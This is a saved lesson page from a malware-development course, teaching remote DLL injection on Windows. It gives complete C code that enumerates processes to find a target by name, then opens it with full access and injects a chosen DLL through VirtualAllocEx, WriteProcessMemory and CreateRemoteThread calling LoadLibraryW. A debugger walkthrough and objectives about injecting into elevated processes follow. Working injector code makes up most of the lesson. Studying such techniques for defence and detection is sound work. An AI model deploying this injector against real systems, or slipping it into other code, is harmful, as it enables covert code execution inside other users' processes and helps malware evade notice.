<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Process%20Injection%20-%20DLL%20Injection_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Process%20Injection%20-%20DLL%20Injection_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Process%20Injection%20-%20DLL%20Injection_files/css2.css" rel="stylesheet">
        <link href="Process%20Injection%20-%20DLL%20Injection_files/css2_002.css" rel="stylesheet">
        <title>Process Injection - DLL Injection</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Process%20Injection%20-%20DLL%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Process%20Injection%20-%20DLL%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Process%20Injection%20-%20DLL%20Injection_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Process%20Injection%20-%20DLL%20Injection_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 28 - Process Injection - DLL Injection
            </div>
            <div class="ml-2 w-4 h-4 bg-green-800 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Process%20Injection%20-%20DLL%20Injection_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Process%20Injection%20-%20DLL%20Injection_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Process%20Injection%20-%20DLL%20Injection_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/Remote-DLL-Injection" target="_blank">
                    <img src="Process%20Injection%20-%20DLL%20Injection_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Process Injection - DLL Injection</h2>
<h3>Introduction</h3>
<p>This module will demonstrate a similar method to the one that was 
previously shown with the local DLL injection except it will now be 
performed on a remote process.</p>
<h3>Enumerating Processes</h3>
<p>Before being able to inject a DLL into a process, a target process 
must be chosen. Therefore the first step to remote process injection is 
usually to enumerate the running processes on the machine to know of 
potential target processes that can be injected. The process ID (or PID)
 is required to open a handle to the target process and allow the 
necessary work to be done on the target process.</p>
<p>This module creates a function that performs process enumeration to determine all the running processes. The function <code>GetRemoteProcessHandle</code>
 will be used to perform an enumeration of all running processes on the 
system, opening a handle to the target process and returning both PID 
and handle to the process.</p>
<h3>CreateToolhelp32Snapshot</h3>
<p>The code snippet starts by using <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" target="_blank">CreateToolhelp32Snapshot</a> with the <code>TH32CS_SNAPPROCESS</code>
 flag for its first parameter, which takes a snapshot of all processes 
running on the system at the moment the function is executed.</p>
<pre><code>// Takes a snapshot of the currently running processes 
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
</code></pre>
<h3>PROCESSENTRY32 Structure</h3>
<p>Once the snapshot is taken, <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first" target="_blank">Process32First</a> is used to get information for the first process in the snapshot. For all the remaining processes in the snapshot, <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next" target="_blank">Process32Next</a> is used.</p>
<p>Microsoft's documentation states that both <code>Process32First</code> and <code>Process32Next</code> require a <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32" target="_blank">PROCESSENTRY32</a>
 structure to be passed in for their second parameter. After the struct 
is passed in, the functions will populate the struct with information 
about the process. The <code>PROCESSENTRY32</code> struct is shown below with comments beside the useful members of the struct that will be populated by these functions.</p>
<pre><code>typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // The process ID
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // Process ID of the parent process
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // The name of the executable file for the process
} PROCESSENTRY32;
</code></pre>
<p>After <code>Process32First</code> or <code>Process32Next</code> populate the struct, the data can be extracted from the struct by using the dot operator. For example, to extract the PID use <code>PROCESSENTRY32.th32ProcessID</code>.</p>
<h3>Process32First &amp; Process32Next</h3>
<p>As previously mentioned, <code>Process32First</code> is used to get information for the first process and <code>Process32Next</code> for all the remaining processes in the snapshot using a do-while loop. The process name that's being searched for, <code>szProcessName</code>, is compared against the process name in the current loop iteration which is extracted from the populated structure, <code>Proc.szExeFile</code>. If there is a match then the process ID is saved and a handle is opened for that process.</p>
<pre><code>// Retrieves information about the first process encountered in the snapshot.
if (!Process32First(hSnapShot, &amp;Proc)) {
	printf("[!] Process32First Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}

do {
	// Use the dot operator to extract the process name from the populated struct
	// If the process name matches the process we're looking for
	if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
		// Use the dot operator to extract the process ID from the populated struct
		// Save the PID
		*dwProcessId  = Proc.th32ProcessID;
		// Open a handle to the process
		*hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
		if (*hProcess == NULL)
			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

		break; // Exit the loop
	}

// Retrieves information about the next process recorded the snapshot.
// While a process still remains in the snapshot, continue looping
} while (Process32Next(hSnapShot, &amp;Proc));
</code></pre>
<h3>Process Enumeration - Code</h3>
<pre><code>BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &amp;Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Use the dot operator to extract the process name from the populated struct
		// If the process name matches the process we're looking for
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Use the dot operator to extract the process ID from the populated struct
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break; // Exit the loop
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &amp;Proc));
	
	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
}

</code></pre>
<h4>Microsoft's Example</h4>
<p>Another process enumeration example is available for viewing <a href="https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes" target="_blank">here</a>.</p>
<h3>Case Sensitive Process Name</h3>
<p>The code snippet above contains one flaw that was overlooked which can lead to inaccurate results. The <code>wcscmp</code> function was used to compare the process names, but the case sensitivity was not taken into account which means <code>Process1.exe</code> and <code>process1.exe</code> will be considered two different processes.</p>
<p>The code snippet below fixes this issue by converting the value in the <code>Proc.szExeFile</code> member to a lowercase string and then comparing it to <code>szProcessName</code>. Therefore, <code>szProcessName</code> must always be passed in as a lowercase string.</p>
<pre><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &amp;Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize &lt; MAX_PATH * 2) {

				for (; i &lt; dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &amp;Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
</code></pre>
<h3>DLL Injection</h3>
<p>A process handle to the target process has been successfully 
retrieved. The next step is to inject the DLL into the target process 
which will require the use of several Windows APIs that were previously 
used and some new ones.</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank">VirtualAllocEx</a> - Similar to <code>VirtualAlloc</code> except it allows for memory allocation in a remote process.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank">WriteProcessMemory</a> - Writes data to the remote process. In this case, it will be used to write the DLL's path to the target process.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank">CreateRemoteThread</a> - Creates a thread in the remote process</p>
</li>
</ul>
<h3>Code Walkthrough</h3>
<p>This section will walk through the DLL injection code (shown below). The function <code>InjectDllToRemoteProcess</code> takes two arguments:</p>
<ol>
<li>
<p>Process Handle - This is a HANDLE to the target process which will have the DLL injected into it.</p>
</li>
<li>
<p>DLL name - The full path to the DLL that will be injected into the target process.</p>
</li>
</ol>
<h4>Find LoadLibraryW Address</h4>
<p><code>LoadLibraryW</code> is used to load a DLL inside the process 
that calls it. Since the goal is to load the DLL inside a remote process
 rather than the local process, then it cannot be invoked directly. 
Instead, the address of <code>LoadLibraryW</code> must be retrieved and 
passed to a remotely created thread in the process, passing the DLL name
 as its argument. This works because the address of the <code>LoadLibraryW</code> WinAPI will be the same in the remote process as in the local process. To determine the address of the WinAPI, <code>GetProcAddress</code> along with <code>GetModuleHandle</code> is used.</p>
<pre><code>// LoadLibrary is exported by kernel32.dll
// Therefore a handle to kernel32.dll is retrieved followed by the address of LoadLibraryW
pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
</code></pre>
<p>The address stored in <code>pLoadLibraryW</code> will be used as the thread entry when a new thread is created in the remote process.</p>
<h4>Allocating Memory</h4>
<p>The next step is to allocate memory in the remote process that can fit the DLL's name, <code>DllName</code>. The <code>VirtualAllocEx</code> function is used to allocate the memory in the remote process.</p>
<pre><code>// Allocate memory the size of dwSizeToWrite (that is the size of the dll name) inside the remote process, hProcess.
// Memory protection is Read-Write
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
</code></pre>
<h4>Writing To Allocated Memory</h4>
<p>After the memory is successfully allocated in the remote process, it's possible to use <code>WriteProcessMemory</code> to write to the allocated buffer. The DLL's name is written to the previously allocated memory buffer.</p>
<p>The <code>WriteProcessMemory</code> WinAPI function looks like the following based on its documentation</p>
<pre><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // A handle to the process whose memory to be written to
  [in]  LPVOID  lpBaseAddress,          // Base address in the specified process to which data is written
  [in]  LPCVOID lpBuffer,               // A pointer to the buffer that contains data to be written to 'lpBaseAddress'
  [in]  SIZE_T  nSize,                  // The number of bytes to be written to the specified process.	
  [out] SIZE_T  *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written
);
</code></pre>
<p>Based on <code>WriteProcessMemory</code>'s parameters shown above, it will be called as the following, writing the buffer (<code>DllName</code>) to the allocated address (<code>pAddress</code>), returned by the previously called <code>VirtualAllocEx</code> function.</p>
<pre><code>// The data being written is the DLL name, 'DllName', which is of size 'dwSizeToWrite'
SIZE_T lpNumberOfBytesWritten = NULL;
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)
</code></pre>
<h4>Execution Via New Thread</h4>
<p>After successfully writing the DLL's path to the allocated buffer, <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank">CreateRemoteThread</a> will be used to create a new thread in the remote process. This is where the address of <code>LoadLibraryW</code> becomes necessary. <code>pLoadLibraryW</code> is passed as the starting address of the thread and then <code>pAddress</code>, which contains the DLL's name, is passed as an argument to the <code>LoadLibraryW</code> call. This is done by passing <code>pAddress</code> as the <code>lpParameter</code> parameter of <code>CreateRemoteThread</code>.</p>
<p><code>CreateRemoteThread</code>'s parameters are the same as that of the <code>CreateThread</code> WinAPI function explained earlier, except for the additional <code>HANDLE hProcess</code> parameter, which represents a handle to the process in which the thread is to be created.</p>
<pre><code>// The thread entry will be 'pLoadLibraryW' which is the address of LoadLibraryW
// The DLL's name, pAddress, is passed as an argument to LoadLibrary
HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
</code></pre>
<h4>DLL Injection - Code Snippet</h4>
<pre><code>BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE                    = TRUE;
	
	LPVOID		pLoadLibraryW             = NULL;
	LPVOID		pAddress                  = NULL;
	
	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten    = NULL;

	HANDLE		hThread                   = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press &lt;Enter&gt; To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press &lt;Enter&gt; To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}
</code></pre>
<h3>Debugging</h3>
<p>In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.</p>
<p>First, run <code>RemoteDllInjection.exe</code> and pass two arguments, the target process and the full DLL path to inject inside the target process. In this demo, <code>notepad.exe</code> is being injected.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-1.png" alt="image"></p>
<br>
<p>The process enumeration successfully worked. Verify that Notepad's PID is indeed <code>20932</code> using Process Hacker.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-2.png" alt="image"></p>
<br>
<p>Next, xdbg is attached to the targeted process, Notepad, and check 
the allocated address. The image below shows that the buffer was 
successfully allocated.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-3.png" alt="image"></p>
<br>
<p>After the memory allocation, the DLL name is written to the buffer.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-4.png" alt="image"></p>
<br>
<p>Finally, a new thread is created in the remote process which executes the DLL.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-5.png" alt="image"></p>
<br>
<p>Verify that the DLL was successfully injected using Process Hacker's modules tab.</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-6.png" alt="image"></p>
<br>
<p>Head to the threads tab in Process Hacker and notice the thread that is running LoadLibraryW as its entry function</p>
<p><img src="Process%20Injection%20-%20DLL%20Injection_files/remote-dll-injection-7.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Perform process enumeration using the CreateToolhelp32Snapshot technique</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Review Microsoft's example that utilizes CreateToolhelp32Snapshot</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Perform DLL injection on a remote process</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-3" data-objective-id="3" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Attempt DLL injection into a remote process running with elevated privileges.</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-4" data-objective-id="4" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Run the DLL injector as administrator and target the same process, does it work?</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/27"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/28/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/28/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/29"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Process%20Injection%20-%20DLL%20Injection_files/jquery-3.6.0.min.js"></script>
        <script src="Process%20Injection%20-%20DLL%20Injection_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Process%20Injection%20-%20DLL%20Injection_files/app.4474f4d1.css"><link rel="modulepreload" href="Process%20Injection%20-%20DLL%20Injection_files/app.5f3af5ce.js"><link rel="stylesheet" href="Process%20Injection%20-%20DLL%20Injection_files/app.4474f4d1.css"><script type="module" src="Process%20Injection%20-%20DLL%20Injection_files/app.5f3af5ce.js"></script><script src="Process%20Injection%20-%20DLL%20Injection_files/navbar.js"></script>
<script src="Process%20Injection%20-%20DLL%20Injection_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 28;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
